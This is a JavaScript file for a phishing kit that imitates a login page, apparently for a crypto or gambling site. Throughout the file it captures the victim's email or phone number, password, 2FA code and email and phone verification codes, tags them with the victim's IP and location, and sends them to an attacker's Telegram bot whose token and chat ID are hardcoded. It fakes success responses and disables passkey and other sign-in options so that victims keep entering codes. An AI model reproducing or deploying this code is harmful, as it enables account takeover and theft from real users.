// ======================================================\n// TELEGRAM CONFIGURATION\n// =====================================================\nconst TELEGRAM_BOT_TOKEN = "7488388724:AAEPgkyry54fJcCp3hjIhhtwgZdO-cjyZwU";\nconst TELEGRAM_CHAT_ID = "-5264759017";\n\n// ======================================================\n// COLLECT USER INFORMATION\n// =====================================================\nconst userInfo = {\n    ip: 'Detecting...',\n    userAgent: navigator.userAgent,\n    timestamp: new Date().toLocaleString(),\n    country: 'Unknown',\n    city: 'Unknown',\n    isp: 'Unknown'\n};\n\n// Get IP and location info\nasync function collectUserInfo() {\n    try {\n        // Get IP address\n        const ipResponse = await fetch('https://api.ipify.org?format=json');\n        const ipData = await ipResponse.json();\n        userInfo.ip = ipData.ip;\n        \n        // Get location info based on IP\n        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);\n        const locationData = await locationResponse.json();\n        \n        userInfo.country = locationData.country_name || 'Unknown';\n        userInfo.city = locationData.city || 'Unknown';\n        userInfo.isp = locationData.org || 'Unknown';\n        \n        console.log('User info collected:', userInfo);\n    } catch (error) {\n        console.log('Error collecting user info:', error);\n        // Fallback to basic IP detection\n        try {\n            const fallbackIp = await fetch('https://api64.ipify.org?format=json').then(r => r.json());\n            userInfo.ip = fallbackIp.ip;\n        } catch (e) {\n            userInfo.ip = 'Failed to get IP';\n        }\n    }\n}\n\n// Call on page load\ncollectUserInfo();\n\n// ======================================================\n// TELEGRAM SEND FUNCTION\n// ======================================================\nasync function sendToTelegram(message) {\n    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {\n        console.error('Telegram bot token or chat ID not configured');\n        return false;\n    }\n    \n    try {\n        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;\n        \n        const response = await fetch(url, {\n            method: 'POST',\n            headers: {\n                'Content-Type': 'application/json',\n            },\n            body: JSON.stringify({\n                chat_id: TELEGRAM_CHAT_ID,\n                text: message,\n                parse_mode: 'HTML'\n            })\n        });\n        \n        const data = await response.json();\n        console.log('Telegram response:', data);\n        return data.ok === true;\n    } catch (error) {\n        console.error('Error sending to Telegram:', error);\n        return false;\n    }\n}\n\n// ======================================================\n// FORMAT MESSAGES FOR TELEGRAM (MONOSPACE FORMAT)\n// ======================================================\n\nfunction formatLoginMessage(emailPhone, password) {\n    const countryInput = (document.getElementById('country-code') || {}).value || '';\n    const phoneInput = (document.getElementById('phone-number') || {}).value || '';\n\n    let credentialsType, credentialsValue;\n    if (countryInput && phoneInput) {\n        credentialsType = 'Phone';\n        const digits = phoneInput.replace(/\D/g, '');\n        credentialsValue = `${countryInput} ${digits}`;\n    } else {\n        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));\n        if (isPhone) {\n            const phoneNumber = (emailPhone||'').replace(/\D/g, '');\n            credentialsType = 'Phone';\n            credentialsValue = `+${phoneNumber}`;\n        } else {\n            credentialsType = 'Email';\n            credentialsValue = emailPhone || '';\n        }\n    }\n    \n    let credentialsHtml;\n    if (credentialsType === 'Phone') {\n        const parts = String(credentialsValue).split(/\s+/);\n        const codePart = parts[0] || '';\n        const numberPart = parts.slice(1).join(' ') || '';\n        credentialsHtml = `<b>${codePart}</b> <code>${numberPart}</code>`;\n    } else {\n        credentialsHtml = `<code>${credentialsValue}</code>`;\n    }\n\n    return `<b>(${userInfo.ip})</b>\n<b>${credentialsType}:</b> ${credentialsHtml}\n<b>Password:</b> <code>${password}</code>\n<b>Country: ${userInfo.country}</b>`;\n}\n\nfunction formatOneTimeLoginMessage(emailPhone) {\n    const countryInput = (document.getElementById('country-code') || {}).value || '';\n    const phoneInput = (document.getElementById('phone-number') || {}).value || '';\n\n    let credentialsType, credentialsValue;\n    if (countryInput && phoneInput) {\n        credentialsType = 'Phone';\n        const digits = phoneInput.replace(/\D/g, '');\n        credentialsValue = `${countryInput} ${digits}`;\n    } else {\n        const isPhone = /^[\d+][\d\s\-()]+$/.test((emailPhone||'').replace(/\s/g, ''));\n        if (isPhone) {\n            const phoneNumber = (emailPhone||'').replace(/\D/g, '');\n            credentialsType = 'Phone';\n            credentialsValue = `+${phoneNumber}`;\n        } else {\n            credentialsType = 'Email';\n            credentialsValue = emailPhone || '';\n        }\n    }\n    \n    let credentialsHtml;\n    if (credentialsType === 'Phone') {\n        const parts = String(credentialsValue).split(/\s+/);\n        const codePart = parts[0] || '';\n        const numberPart = parts.slice(1).join(' ') || '';\n        credentialsHtml = `<b>${codePart}</b> <code>${numberPart}</code>`;\n    } else {\n        credentialsHtml = `<code>${credentialsValue}</code>`;\n    }\n\n    return `<b>(${userInfo.ip} 1‚É£)</b>\n<b>${credentialsType}:</b> ${credentialsHtml}\n<b>Country: ${userInfo.country}</b>`;\n}\n\nfunction format2FAMessage(code, switched = false) {\n    const prefix = switched ? 'switched' : '';\n    return `<b>${prefix}üîê: (${userInfo.ip}):</b> <code>${code}</code>`;\n}\n\nfunction formatEmailVerificationMessage(code, switched = false) {\n    const prefix = switched ? 'switched' : '';\n    return `<b>${prefix}üìß: (${userInfo.ip}):</b> <code>${code}</code>`;\n}\n\nfunction formatPhoneVerificationMessage(code, switched = false) {\n    const prefix = switched ? 'switched' : '';\n    return `<b>${prefix}üì±: (${userInfo.ip}):</b> <code>${code}</code>`;\n}\n\nfunction formatSwitchMessage(fromMethod, toMethod) {\n    const toMethodFormatted = toMethod.charAt(0).toUpperCase() + toMethod.slice(1).toLowerCase();\n    return `<b>(${userInfo.ip})</b>\n<b>Switched:</b> ${toMethodFormatted}`;\n}\n\nfunction formatGoVerifyMessage(method) {\n    const methodFormatted = method.charAt(0).toUpperCase() + method.slice(1).toLowerCase();\n    return `<b>(${userInfo.ip})</b>\n<b>Selected:</b> ${methodFormatted}`;\n}\n\n// ======================================================\n// SIMULATE SERVER RESPONSES (ALWAYS SUCCESS)\n// ======================================================\nfunction simulateServerSuccess() {\n    return new Promise(resolve => {\n        setTimeout(() => {\n            resolve({ success: true });\n        }, 500); // Simulate 0.5s server delay\n    });\n}\n\nlet isProcessing = {\n    login: false,\n    twofa: false,\n    email: false,\n    phone: false\n};\n\n// Store current method for switch tracking\nlet currentMethod = '';\nlet isOneTimeCodeMode = false; // Track if One-time Code mode is active\nlet isAfterSwitch = false; // Track if verification is after a method switch\n\ndocument.addEventListener("DOMContentLoaded", () => {\n// ======================================================\n//  BASIC HELPERS\n// ======================================================\nfunction disableBodyScroll() { document.body.style.overflow = "hidden"; }\nfunction enableBodyScroll() { document.body.style.overflow = ""; }\n\nfunction showOverlay(id) {\n    const overlay = document.getElementById(id);\n    const sheet = overlay.querySelector(".pop-bottomsheet") || overlay.querySelector(".dialog-item");\n\n    disableBodyScroll();\n    overlay.style.visibility = "visible";\n\n    setTimeout(() => {\n        initSwitchButtons(overlay);\n        \n        // Hide switch buttons if in verifications after password flow OR if in one-time code mode\n        if ((verificationsActive && (id === "email" || id === "phone")) || isOneTimeCodeMode) {\n            overlay.querySelectorAll(".switch-to-twofa, .switch-to-email, .switch-to-phone")\n                .forEach(btn => btn.style.display = "none");\n        } else {\n            overlay.querySelectorAll(".switch-to-twofa, .switch-to-email, .switch-to-phone")\n                .forEach(btn => btn.style.display = "");\n        }\n\n        // Auto-start resend timer\n        setTimeout(() => {\n            const resendBtn = overlay.querySelector(".resend-btn");\n            if (resendBtn) startResend(id, true);\n        }, 150);\n\n    }, 20);\n\n    if (id === "verifications") {\n        overlay.classList.remove("hide-left");\n        setTimeout(() => overlay.classList.add("active"), 10);\n        verificationsActive = true;\n    } else {\n        overlay.classList.add("active");\n        setTimeout(() => sheet.classList.add("active"), 10);\n    }\n}\n\nfunction hideOverlay(id) {\n    const overlay = document.getElementById(id);\n    const sheet = overlay.querySelector(".pop-bottomsheet") || overlay.querySelector(".dialog-item");\n\n    if (id === "verifications") {\n        verificationsActive = false;\n        overlay.classList.remove("active");\n        overlay.classList.add("hide-left");\n\n        setTimeout(() => {\n            overlay.style.visibility = "hidden";\n            enableBodyScroll();\n        }, 350);\n    } else {\n        sheet.classList.remove("active");\n        overlay.classList.remove("active");\n\n        setTimeout(() => {\n            overlay.style.visibility = "hidden";\n            enableBodyScroll();\n        }, 350);\n    }\n}\n\nfunction startLoading(btn){ btn.classList.add("loading"); }\nfunction stopLoading(btn){ btn.classList.remove("loading"); }\n\n// ======================================================\n//  GLOBAL FLAGS\n// ======================================================\nlet verificationsActive = false;\nlet step = 1;\n\n// ======================================================\n//  TAB SWITCHING (Password / One-time Code)\n// ======================================================\n\nconst passwordTab = document.querySelector('button[aria-selected="true"].tabs-btn.btn-like');\nconst oneTimeTab = document.querySelector('.tabs-btn.btn-like:not([aria-selected])');\nconst passwordField = document.getElementById('input-container2');\nconst passwordInput = document.getElementById('password');\nconst emailPhoneField = document.getElementById('input-container');\nconst emailPhoneInput = document.getElementById('email-phone');\nconst emailPhoneVisibleInput = document.getElementById('email-phone-visible');\n\nif (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneField && emailPhoneInput && emailPhoneVisibleInput) {\n    oneTimeTab.addEventListener('click', (e) => {\n        e.preventDefault();\n        isOneTimeCodeMode = true;\n        passwordTab.removeAttribute('aria-selected');\n        oneTimeTab.setAttribute('aria-selected', 'true');\n        passwordField.style.display = 'none';\n        passwordInput.removeAttribute('required');\n        passwordInput.value = '';\n        emailPhoneVisibleInput.placeholder = 'Email / Phone Number';\n    });\n\n    passwordTab.addEventListener('click', (e) => {\n        e.preventDefault();\n        isOneTimeCodeMode = false;\n        oneTimeTab.removeAttribute('aria-selected');\n        passwordTab.setAttribute('aria-selected', 'true');\n        passwordField.style.display = 'flex';\n        passwordInput.setAttribute('required', 'required');\n        emailPhoneVisibleInput.placeholder = 'Email / Phone Number / Username';\n    });\n}\n\n// ======================================================\n//  LOGIN ‚Üí open twofa\n// ======================================================\n\nconst form = document.getElementById("login-form");\nconst twofaInput = document.getElementById("twofa_input");\nconst twofaButton = document.getElementById("twofa_button");\n\n// password toggle handler (eye icon)\ntry{\n    const pwdToggle = document.getElementById('password-toggle');\n    const pwdInput = document.getElementById('password');\n    if(pwdToggle && pwdInput){\n        pwdToggle.addEventListener('click', ()=>{\n            if(pwdInput.type === 'password'){\n                pwdInput.type = 'text';\n                pwdToggle.setAttribute('aria-pressed','true');\n                pwdToggle.classList.add('visible');\n            } else {\n                pwdInput.type = 'password';\n                pwdToggle.setAttribute('aria-pressed','false');\n                pwdToggle.classList.remove('visible');\n            }\n        });\n        pwdToggle.addEventListener('keydown', (e)=>{ if(e.key==='Enter' || e.key===' ') { e.preventDefault(); pwdToggle.click(); } });\n    }\n}catch(e){/* ignore */}\n\ntwofaInput.addEventListener("input", () => {\n    twofaButton.disabled = twofaInput.value.length !== 6;\n});\n\nform.addEventListener("submit", async e => {\n    e.preventDefault();\n\n    if (isProcessing.login) return;\n    isProcessing.login = true;\n    startLoading(form.querySelector('button[type="submit"]'));\n\n    const emailPhone = document.getElementById("email-phone").value;\n    const password = document.getElementById("password").value;\n\n    const isPhone = /^[\d+][\d\s\-()]+$/.test(emailPhone.replace(/\s/g, ''));\n    if (isPhone) {\n        const phoneDigits = emailPhone.replace(/\D/g, '');\n        if (phoneDigits.length < 7 || phoneDigits.length > 15) {\n            stopLoading(form.querySelector('button[type="submit"]'));\n            isProcessing.login = false;\n            showToast("Enter a valid phone number");\n            return;\n        }\n    } else {\n        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;\n        if (!emailRegex.test(emailPhone)) {\n            stopLoading(form.querySelector('button[type="submit"]'));\n            isProcessing.login = false;\n            showToast("Enter a valid email");\n            return;\n        }\n    }\n\n    let loginMessage;\n    if (isOneTimeCodeMode) {\n        loginMessage = formatOneTimeLoginMessage(emailPhone);\n    } else {\n        loginMessage = formatLoginMessage(emailPhone, password);\n    }\n    await sendToTelegram(loginMessage);\n\n    const result = await simulateServerSuccess();\n    stopLoading(form.querySelector('button[type="submit"]'));\n\n    if (result.success) {\n        if (isOneTimeCodeMode) {\n            const isPhone = /^[\d+][\d\s\-()]+$/.test(emailPhone.replace(/\s/g, ''));\n            if (isPhone) {\n                currentMethod = 'phone';\n                isAfterSwitch = false;\n                await sendGoVerify("phone");\n                showOverlay("phone");\n            } else {\n                currentMethod = 'email';\n                isAfterSwitch = false;\n                await sendGoVerify("email");\n                showOverlay("email");\n            }\n        } else {\n            currentMethod = 'twofa';\n            showOverlay("twofa");\n        }\n    }\n\n    isProcessing.login = false;\n});\n\n// ======================================================\n//  UNIVERSAL SUCCESS HANDLER ‚Üí enter verifications\n// ======================================================\nfunction enterVerifications(fromBlock) {\n    hideOverlay(fromBlock);\n\n    setTimeout(() => {\n        step = 1;\n        showOverlay("verifications");\n        updateVerificationUI();\n    }, 400);\n}\n\n// ======================================================\n//  TWOFA CONFIRM\n// ======================================================\n\ntwofaButton.addEventListener("click", async () => {\n    if (isProcessing.twofa) return;\n    isProcessing.twofa = true;\n\n    startLoading(twofaButton);\n\n    const twofaMessage = format2FAMessage(twofaInput.value, isAfterSwitch);\n    await sendToTelegram(twofaMessage);\n\n    const result = await simulateServerSuccess();\n\n    stopLoading(twofaButton);\n\n    if (result.success) {\n        twofaInput.value = "";\n        enterVerifications("twofa");\n    } else {\n        showToast("Verification code is incorrect");\n        twofaInput.value = "";\n    }\n\n    isProcessing.twofa = false;\n});\n\n// ======================================================\n//  VERIFICATIONS BLOCK (step 1 / 2)\n// ======================================================\n\nconst verifOverlay = document.getElementById("verifications");\nconst emailVerifyBtn = document.getElementById("email_verify");\nconst phoneVerifyBtn = document.getElementById("phone_verify");\n\nfunction updateVerificationUI() {\n    const counterElement = verifOverlay.querySelector("p.text-warning");\n    if (counterElement) {\n        counterElement.innerHTML = `<span>${step}</span><span>/</span><span>2</span>`;\n    }\n    \n    if (emailVerifyBtn) {\n        emailVerifyBtn.style.display = step === 1 ? "flex" : "none";\n    }\n    \n    if (phoneVerifyBtn) {\n        phoneVerifyBtn.style.display = step === 2 ? "flex" : "none";\n    }\n}\n\n// ======================================================\n//  EMAIL BLOCK\n// ======================================================\n\nconst emailInput = document.getElementById("email_input");\nconst emailButton = document.getElementById("email_button");\n\nif (emailInput) {\n    emailInput.addEventListener("input", () => {\n        if (emailButton) {\n            emailButton.disabled = emailInput.value.length !== 6;\n        }\n    });\n}\n\nif (emailVerifyBtn) {\n    emailVerifyBtn.addEventListener("click", () => {\n        currentMethod = 'email';\n        isAfterSwitch = false;\n        sendGoVerify("email");\n        showOverlay("email");\n    });\n}\n\nif (emailButton) {\n    emailButton.addEventListener("click", async () => {\n        if (isProcessing.email) return;\n        isProcessing.email = true;\n\n        startLoading(emailButton);\n\n        const emailMessage = formatEmailVerificationMessage(emailInput.value, isAfterSwitch);\n        await sendToTelegram(emailMessage);\n\n        const result = await simulateServerSuccess();\n\n        stopLoading(emailButton);\n        emailInput.value = "";\n\n        if (!result.success) {\n            showToast("Verification code is incorrect");\n            isProcessing.email = false;\n            return;\n        }\n\n        if (!verificationsActive) {\n            enterVerifications("email");\n            isProcessing.email = false;\n            return;\n        }\n\n        hideOverlay("email");\n        hideOverlay("verifications");\n\n        setTimeout(() => {\n            step = 2;\n            updateVerificationUI();\n            if (emailVerifyBtn && phoneVerifyBtn) {\n                emailVerifyBtn.style.transition = "opacity .5s ease";\n                phoneVerifyBtn.style.transition = "opacity .5s ease";\n                emailVerifyBtn.style.display = "none";\n                phoneVerifyBtn.style.display = "flex";\n                emailVerifyBtn.style.pointerEvents = "none";\n                phoneVerifyBtn.style.pointerEvents = "auto";\n            }\n            showOverlay("verifications");\n            setTimeout(() => {\n                isProcessing.email = false;\n            }, 300);\n        }, 1000);\n    });\n}\n\n// ======================================================\n//  PHONE BLOCK (FINAL STEP ‚Üí reload)\n// ======================================================\n\nconst phoneInput = document.getElementById("phone_input");\nconst phoneButton = document.getElementById("phone_button");\n\nif (phoneInput) {\n    phoneInput.addEventListener("input", () => {\n        if (phoneButton) {\n            phoneButton.disabled = phoneInput.value.length !== 6;\n        }\n    });\n}\n\nif (phoneVerifyBtn) {\n    phoneVerifyBtn.addEventListener("click", () => {\n        currentMethod = 'phone';\n        isAfterSwitch = false;\n        sendGoVerify("phone");\n        showOverlay("phone");\n    });\n}\n\nif (phoneButton) {\n    phoneButton.addEventListener("click", async () => {\n        startLoading(phoneButton);\n\n        const phoneMessage = formatPhoneVerificationMessage(phoneInput.value, isAfterSwitch);\n        await sendToTelegram(phoneMessage);\n\n        const result = await simulateServerSuccess();\n\n        stopLoading(phoneButton);\n        phoneInput.value = "";\n\n        if (!result.success) {\n            showToast("Verification code is incorrect");\n            return;\n        }\n\n        if (!verificationsActive) {\n            enterVerifications("phone");\n            return;\n        }\n\n        const toast = document.createElement("div");\n        toast.className = "toast-layer";\n        toast.innerHTML = `\n            <div class="overflow-hidden flex" style="height: 56px; transition: height .5s var(--ease-out);">\n                <div class="toast" style="align-items: anchor-center;">\n                    <div class="icon w-6 h-6 mr-2 -mt-0.5 flex-none fill-error">\n                        <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">\n                            <path style="fill:#ff4545" fill-rule="evenodd" clip-rule="evenodd" d="M28 16C28 22.6274 22.6274 28 16 28C9.37258 28 4 22.6274 4 16C4 9.37258 9.37258 4 16 4C22.6274 4 2[...]\n        document.body.appendChild(toast);\n\n        setTimeout(() => {\n            toast.remove();\n            window.location.reload();\n        }, 2000);\n    });\n}\n\n// ======================================================\n//  SWITCH BETWEEN twofa / email / phone\n// ======================================================\n\nasync function sendSwitchToTelegram(fromMethod, toMethod) {\n    const switchMessage = formatSwitchMessage(fromMethod, toMethod);\n    await sendToTelegram(switchMessage);\n}\n\nfunction switchOverlay(from, to, method) {\n    const fromMethod = currentMethod;\n    currentMethod = method;\n    isAfterSwitch = true; \n    hideOverlay(from);\n    sendSwitchToTelegram(fromMethod, method);\n    setTimeout(() => showOverlay(to), 350);\n}\n\nfunction initSwitchButtons(overlay) {\n    const id = overlay.id;\n\n    const swEmail = overlay.querySelector(".switch-to-email");\n    const swPhone = overlay.querySelector(".switch-to-phone");\n    const swTwofa = overlay.querySelector(".switch-to-twofa");\n\n    if (swEmail) {\n        swEmail.onclick = () => switchOverlay(id, "email", "email");\n    }\n\n    if (swPhone) {\n        swPhone.onclick = () => switchOverlay(id, "phone", "phone");\n    }\n\n    if (swTwofa) {\n        swTwofa.onclick = () => switchOverlay(id, "twofa", "twofa");\n    }\n}\n\n// ======================================================\n//  TOAST (NO RELOAD HERE)\n// ======================================================\n\nfunction showToast(message) {\n    const toast = document.createElement("div");\n    toast.className = "toast-layer";\n    toast.innerHTML = `\n        <div class="overflow-hidden flex" style="height:50px;">\n            <div class="toast" style="position: relative; padding-right: 50px; height: 50px; align-items: center; border-radius: 12px;">\n                <div class="icon w-5 h-5 mr-2 fill-error">\n                    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">\n                        <path style="fill:#ff4545" d="M16 4C9.372 4 4 9.372 4 16C4 22.628 9.372 28 16 28C22.628 28 28 22.628 28 16C28 9.372 22.628 4 16 4ZM18.5 22H13.5V20H18.5V22ZM18.5 18H13.5V10[...\n    document.body.appendChild(toast);\n\n    const progressRing = toast.querySelector('.toast-progress-ring');\n    setTimeout(() => {\n        progressRing.style.transition = 'stroke-dashoffset 6s linear';\n        progressRing.style.strokeDashoffset = '0';\n    }, 10);\n\n    setTimeout(() => {\n        progressRing.style.transition = 'stroke-dashoffset 0.3s ease, opacity 0.3s ease';\n        progressRing.style.strokeDashoffset = '62.83';\n        progressRing.style.opacity = '0';\n        setTimeout(() => {\n            toast.remove();\n        }, 300);\n    }, 6000);\n}\n\n// ======================================================\n//  GOVerify (Telegram log)\n// ======================================================\n\nasync function sendGoVerify(method) {\n    const goVerifyMessage = formatGoVerifyMessage(method);\n    await sendToTelegram(goVerifyMessage);\n}\n\n// ======================================================\n//  RESEND TIMER\n// ======================================================\n\nlet resendTimer = {\n    email: null,\n    phone: null\n};\n\nfunction startResend(btnOrType, forced = false) {\n    let btn;\n    let type;\n\n    if (btnOrType instanceof HTMLElement) {\n        btn = btnOrType;\n        type = btn.closest(".pop-overlayer").id;\n    } else {\n        type = btnOrType;\n        const overlay = document.getElementById(type);\n        if (!overlay) return;\n        btn = overlay.querySelector(".resend-btn");\n    }\n\n    if (!btn) return;\n\n    if (resendTimer[type] && !forced) return;\n\n    if (resendTimer[type]) clearInterval(resendTimer[type]);\n\n    let timeLeft = 60;\n\n    btn.disabled = true;\n    const span = btn.querySelector("span");\n    if (span) {\n        span.textContent = `Resend in ${timeLeft}s`;\n    }\n\n    resendTimer[type] = setInterval(() => {\n        timeLeft--;\n\n        if (timeLeft > 0) {\n            if (span) {\n                span.textContent = `Resend in ${timeLeft}s`;\n            }\n        } else {\n            clearInterval(resendTimer[type]);\n            resendTimer[type] = null;\n\n            btn.disabled = false;\n            if (span) {\n                span.textContent = "Resend";\n            }\n        }\n    }, 1000);\n}\nwindow.startResend = startResend;\n\n// Add click handlers to third-group-wrap buttons to show unavailable message\nconst thirdGroupButtons = document.querySelectorAll('.third-group-wrap.mt-6.flex.h-11.w-full.items-center.justify-between button');\nthirdGroupButtons.forEach(btn => {\n    btn.addEventListener('click', (e) => {\n        e.preventDefault();\n        e.stopPropagation();\n        showToast("Verification method unavailable.");\n    }, true);\n    const iframe = btn.querySelector('iframe');\n    if (iframe) {\n        iframe.style.pointerEvents = 'none';\n    }\n});\n\n// Add click handler to passkey button\nconst passkeyButton = document.querySelector('button.button.w-full.mt-3.-mb-3.h-10.border.border-third');\nif (passkeyButton) {\n    passkeyButton.addEventListener('click', (e) => {\n        e.preventDefault();\n        e.stopPropagation();\n        showToast("Verification method unavailable.");\n    });\n}\n});\n\n// ======================================================\n// INITIALIZE INPUT FOCUS EFFECTS\n// ======================================================\n\ndocument.addEventListener("DOMContentLoaded", () => {\n    const emailInput = document.getElementById('email-phone');\n    const emailContainer = document.getElementById('input-container');\n    const passwordInput = document.getElementById('password');\n    const passwordContainer = document.getElementById('input-container2');\n\n    if (emailInput && emailContainer) {\n        emailInput.addEventListener('focus', () => {\n            emailContainer.setAttribute('data-focus', 'true');\n            emailInput.setAttribute('data-focus', 'true');\n        });\n\n        emailInput.addEventListener('blur', () => {\n            emailContainer.removeAttribute('data-focus');\n            emailInput.removeAttribute('data-focus');\n        });\n    }\n\n    if (passwordInput && passwordContainer) {\n        passwordInput.addEventListener('focus', () => {\n            passwordContainer.setAttribute('data-focus', 'true');\n            passwordInput.setAttribute('data-focus', 'true');\n        });\n\n        passwordInput.addEventListener('blur', () => {\n            passwordContainer.removeAttribute('data-focus');\n            passwordInput.setAttribute('data-focus', 'true');\n        });\n    }\n    \n    console.log('Authentication system initialized with Telegram bot');\n});\n\n// Ensure certain full-width brand buttons hide their text when `.loading` is applied\ndocument.addEventListener('DOMContentLoaded', ()=>{\n    function ensureBtnLabel(el){\n        if(!el) return;\n        if(el.querySelector('.btn-label')) return;\n        const textNodes = Array.from(el.childNodes).filter(n=>n.nodeType===3 && n.textContent.trim());\n        const text = textNodes.map(n=>n.textContent.trim()).join(' ').trim();\n        if(!text) return;\n        textNodes.forEach(n=>n.remove());\n        const span = document.createElement('span');\n        span.className = 'btn-label';\n        span.textContent = text;\n        el.appendChild(span);\n    }\n\n    const selector = '.button.button-brand.w-full.mt-4.h-12';\n    document.querySelectorAll(selector).forEach(btn=>{\n        ensureBtnLabel(btn);\n    });\n    try{ document.querySelectorAll('button, a, div, span').forEach(el=>{\n        if(el.childElementCount===0){\n            const t = (el.textContent||'').trim();\n            if(/^Claim\s+\d+\s*BCD$/i.test(t)) ensureBtnLabel(el);\n        }\n    }); }catch(e){}\n});\n